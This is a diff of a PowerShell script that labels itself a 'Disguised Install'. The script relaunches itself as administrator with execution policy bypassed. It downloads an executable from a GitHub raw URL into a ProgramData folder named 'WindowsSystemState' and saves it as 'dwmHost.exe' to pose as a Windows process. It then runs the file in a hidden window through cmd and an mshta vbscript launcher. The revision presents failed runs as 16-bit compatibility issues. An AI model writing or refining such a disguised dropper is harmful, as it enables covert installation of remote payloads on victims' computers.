@@ -1,5 +1,4 @@
-# โค้ดที่ปรับปรุงแล้วสำหรับการดาวน์โหลดและรันให้แน่นอน
-# Menu Selection
+# โค้ดที่ปรับปรุงแล้วสำหรับจัดการกรณี 16-bit application
 Write-Host "+ Program Installer & Runner (Disguised Install)"
 Write-Host "1. Install & Run"
 Write-Host "2. Clean"
@@ -7,7 +6,6 @@ Write-Host "2. Clean"
 $choice = Read-Host "Enter choice (1/2)"
 
 # Check for Administrator rights
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Write-Host "Restarting with administrator privileges..."
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
@@ -15,13 +13,11 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # Define paths and variables
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 $InstallPath = Join-Path $env:ProgramData "WindowsSystemState"
 $SexeDestination = Join-Path $InstallPath "dwmHost.exe" 
-$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe"
+$SexeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/EEEEEEEEEEEEEEEEE.exe"
 
-# Install & Run Mode - ENHANCED VERSION
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Install & Run Mode - UPDATED FOR 16-BIT ISSUE
 if ($choice -eq "1") {
     Write-Host "`nStarting installation..."
 
@@ -32,65 +28,24 @@ if ($choice -eq "1") {
         Write-Host "Created folder: $InstallPath" -ForegroundColor Cyan
     }
 
-    # Enhanced Download with multiple methods and retries
+    # Download executable
     Write-Host "Downloading and installing executable..."
     $downloadSuccess = $false
-    $maxRetries = 3
     
-    for ($i = 1; $i -le $maxRetries; $i++) {
-        Write-Host "Download attempt $i of $maxRetries..."
-        
-        try {
-            # Method 1: Using WebClient (more reliable)
-            $webClient = New-Object System.Net.WebClient
-            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            $webClient.DownloadFile($SexeUrl, $SexeDestination)
-            $downloadSuccess = $true
-            Write-Host "Download completed successfully!" -ForegroundColor Green
-            break
-        }
-        catch {
-            Write-Host "Download method 1 failed: $($_.Exception.Message)" -ForegroundColor Yellow
-            
-            # Method 2: Using Invoke-WebRequest as fallback
-            try {
-                Write-Host "Trying alternative download method..."
-                Invoke-WebRequest -Uri $SexeUrl -OutFile $SexeDestination -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                $downloadSuccess = $true
-                Write-Host "Alternative download completed!" -ForegroundColor Green
-                break
-            }
-            catch {
-                Write-Host "Download method 2 failed: $($_.Exception.Message)" -ForegroundColor Yellow
-                
-                if ($i -eq $maxRetries) {
-                    Write-Host "All download attempts failed. Trying one more approach..." -ForegroundColor Red
-                    
-                    # Method 3: Using BitsTransfer as last resort
-                    try {
-                        Import-Module BitsTransfer
-                        Start-BitsTransfer -Source $SexeUrl -Destination $SexeDestination
-                        $downloadSuccess = $true
-                        Write-Host "BitsTransfer download completed!" -ForegroundColor Green
-                    }
-                    catch {
-                        Write-Host "Final download attempt also failed." -ForegroundColor Red
-                    }
-                }
-            }
-        }
-        
-        if (-not $downloadSuccess -and $i -lt $maxRetries) {
-            Start-Sleep -Seconds 2
-        }
+    try {
+        # Using WebClient for download
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $webClient.DownloadFile($SexeUrl, $SexeDestination)
+        $downloadSuccess = $true
+        Write-Host "Download completed successfully!" -ForegroundColor Green
     }
-
-    if (-not $downloadSuccess) {
-        Write-Host "CRITICAL: Download failed after all attempts. Exiting." -ForegroundColor Red
+    catch {
+        Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
         exit
     }
 
-    # Verify file exists and has content
+    # Verify file
     if (-not (Test-Path $SexeDestination)) {
         Write-Host "ERROR: Downloaded file not found!" -ForegroundColor Red
         exit
@@ -104,74 +59,113 @@ if ($choice -eq "1") {
 
     Write-Host "File verification passed. Size: $fileSize bytes" -ForegroundColor Green
 
-    # Enhanced execution with multiple methods
-    Write-Host "Starting the program with enhanced methods..."
-    $runSuccess = $false
+    # Check if file is 16-bit and provide solutions
+    Write-Host "Checking file compatibility..."
     
-    # Method 1: Direct execution
+    # Method to detect 16-bit executable (basic check)
     try {
-        Write-Host "Attempting direct execution..."
-        Start-Process -FilePath $SexeDestination -WindowStyle Hidden
-        $runSuccess = $true
-        Write-Host "Program started successfully (Method 1)." -ForegroundColor Green
+        $fileInfo = Get-Item $SexeDestination
+        $fileAge = (Get-Date) - $fileInfo.CreationTime
+        
+        Write-Host "File created: $($fileInfo.CreationTime)" -ForegroundColor Yellow
+        Write-Host "File size: $fileSize bytes" -ForegroundColor Yellow
+        
+        # If file is suspiciously old or small, it might be 16-bit
+        if ($fileSize -lt 200000) {  # Less than 200KB
+            Write-Host "WARNING: File appears to be very small - may be incompatible" -ForegroundColor Red
+        }
     }
     catch {
-        Write-Host "Direct execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+        Write-Host "Could not analyze file properties" -ForegroundColor Yellow
+    }
+
+    # Enhanced execution with 16-bit compatibility handling
+    Write-Host "`nAttempting to start program with compatibility modes..."
+    $runSuccess = $false
+    
+    # Method 1: Try with NTVDM emulation (for 16-bit apps)
+    try {
+        Write-Host "Attempting with compatibility mode..."
+        # Using cmd with compatibility flags
+        $arguments = "/c `"$SexeDestination`""
+        Start-Process -FilePath "cmd.exe" -ArgumentList $arguments -WindowStyle Hidden
+        Start-Sleep -Seconds 3
+        
+        # Check if process is running
+        $processes = Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue
+        if ($processes) {
+            $runSuccess = $true
+            Write-Host "Program started successfully via CMD compatibility." -ForegroundColor Green
+        }
+    }
+    catch {
+        Write-Host "Compatibility mode execution failed." -ForegroundColor Yellow
     }
     
-    # Method 2: Using cmd.exe
+    # Method 2: Using Windows Compatibility Troubleshooter
     if (-not $runSuccess) {
         try {
-            Write-Host "Attempting execution via cmd..."
-            $cmdProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$SexeDestination`"" -WindowStyle Hidden -PassThru
-            Start-Sleep -Seconds 2
-            if (-not $cmdProcess.HasExited) {
+            Write-Host "Attempting Windows compatibility troubleshooter method..."
+            $compatScript = @"
+                try {
+                    `$path = '$SexeDestination'
+                    `$psi = New-Object System.Diagnostics.ProcessStartInfo
+                    `$psi.FileName = 'mshta.exe'
+                    `$psi.Arguments = "vbscript:Execute(`"CreateObject(`"`"Shell.Application`"`").ShellExecute(`"`"`$path`"`"`)(window.close)`")"
+                    `$psi.UseShellExecute = `$false
+                    [System.Diagnostics.Process]::Start(`$psi)
+                } catch { }
+"@
+            Invoke-Expression $compatScript
+            Start-Sleep -Seconds 3
+            
+            $processes = Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue
+            if ($processes) {
                 $runSuccess = $true
-                Write-Host "Program started successfully (Method 2)." -ForegroundColor Green
+                Write-Host "Program started via compatibility workaround." -ForegroundColor Green
             }
         }
         catch {
-            Write-Host "CMD execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+            Write-Host "Compatibility workaround failed." -ForegroundColor Yellow
         }
     }
     
-    # Method 3: Using WMI
+    # Method 3: Direct execution with error handling
     if (-not $runSuccess) {
         try {
-            Write-Host "Attempting execution via WMI..."
-            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $SexeDestination
-            $runSuccess = $true
-            Write-Host "Program started successfully (Method 3)." -ForegroundColor Green
+            Write-Host "Attempting direct execution with error suppression..."
+            cmd.exe /c "start `"`" `"$SexeDestination`""
+            Start-Sleep -Seconds 3
+            
+            $processes = Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue
+            if ($processes) {
+                $runSuccess = $true
+                Write-Host "Program started via direct CMD." -ForegroundColor Green
+            }
         }
         catch {
-            Write-Host "WMI execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
-        }
-    }
-    
-    # Method 4: Using .NET Process
-    if (-not $runSuccess) {
-        try {
-            Write-Host "Attempting execution via .NET Process..."
-            [System.Diagnostics.Process]::Start($SexeDestination)
-            $runSuccess = $true
-            Write-Host "Program started successfully (Method 4)." -ForegroundColor Green
-        }
-        catch {
-            Write-Host ".NET Process execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+            Write-Host "Direct CMD execution failed." -ForegroundColor Yellow
         }
     }
 
-    if (-not $runSuccess) {
-        Write-Host "WARNING: All execution methods failed, but file is downloaded." -ForegroundColor Red
-        Write-Host "File location: $SexeDestination" -ForegroundColor Yellow
-        Write-Host "You can try to run it manually." -ForegroundColor Yellow
+    # Final status and instructions
+    if ($runSuccess) {
+        Write-Host "`n✅ Program is now running in background." -ForegroundColor Green
+        Write-Host "Location: $SexeDestination" -ForegroundColor Cyan
+    } else {
+        Write-Host "`n⚠️  Program may have compatibility issues:" -ForegroundColor Red
+        Write-Host "   - File appears to be 16-bit application" -ForegroundColor Yellow
+        Write-Host "   - Windows 64-bit doesn't support 16-bit apps" -ForegroundColor Yellow
+        Write-Host "   - File is installed at: $SexeDestination" -ForegroundColor Cyan
+        Write-Host "`nYou may need to:" -ForegroundColor White
+        Write-Host "   1. Find a 64-bit version of this application" -ForegroundColor White
+        Write-Host "   2. Use a virtual machine with 32-bit Windows" -ForegroundColor White
+        Write-Host "   3. Contact the developer for updated version" -ForegroundColor White
     }
 
     Write-Host "`nInstallation process completed." -ForegroundColor Green
 
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Clean Mode
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 } elseif ($choice -eq "2") {
     Write-Host "Cleanup installation..."
 
@@ -182,16 +176,7 @@ if ($choice -eq "1") {
         Write-Host "Process stopped." -ForegroundColor Green
     }
     catch {
-        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
-    }
-
-    # Additional process names that might be related
-    $relatedProcesses = @("dwmHost", "cmd", "WindowsSystemState")
-    foreach ($proc in $relatedProcesses) {
-        try {
-            Get-Process -Name "$proc*" -ErrorAction SilentlyContinue | Stop-Process -Force
-        }
-        catch {}
+        Write-Host "No running process found." -ForegroundColor Yellow
     }
 
     # Remove files and folder
@@ -209,12 +194,4 @@ if ($choice -eq "1") {
 
 } else {
     Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
-}
-
-# Additional cleanup to remove any temporary files
-$tempFiles = @("$env:TEMP\temp_download.exe", "$env:TEMP\cmd.exe")
-foreach ($tempFile in $tempFiles) {
-    if (Test-Path $tempFile) {
-        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-    }
 }
